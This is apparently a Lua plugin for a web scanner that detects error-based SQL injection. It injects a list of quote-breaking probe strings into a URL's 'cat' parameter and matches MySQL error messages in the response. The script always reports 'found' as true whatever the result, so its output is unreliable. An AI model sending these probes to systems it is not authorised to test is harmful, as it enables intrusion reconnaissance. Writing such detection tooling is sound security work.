urlparse = require "net.url"

sqli_errors = {'SQL syntax.*?MySQL', 'Warning.*?\\Wmysqli?_', 
'MySQLSyntaxErrorException',
'valid MySQL result', 
'check the manual that (corresponds to|fits) your MySQL server version', "Unknown column '[^ ]+' in 'field list'"}

payloads = {
    "'123",
    "''123",
    "`123",
    "\")123",
    "\"))123",
    "`)123",
    "`))123",
    "'))123",
    "')123\"123",
    "[]123",
    "\"\"123",
    "'\"123",
    "\"'123",
    "\123",
}

function matcher(resp)
    for index_key,index_value in ipairs(sqli_errors) do
        match = is_match(index_value,resp.body:GetStrOrNil()) 
        if match == false then
            -- NOTHING
        else
            print(string.format(">> FOUND:  %s | %s",resp.url:GetStrOrNil(),index_value))
            return 1
        end
    end
end

function main(url)
    for index_key, index_value in ipairs(payloads) do
        query = urlparse.parse(url)
        query.query.cat = index_value
        resp = send_req(string.format("%s",query))
        if resp.errors:GetErrorOrNil() == nil then
            if matcher(resp) == 1 then
                break
            end
        end
    end
    report = {}
    report["found"] = true
    return report
end
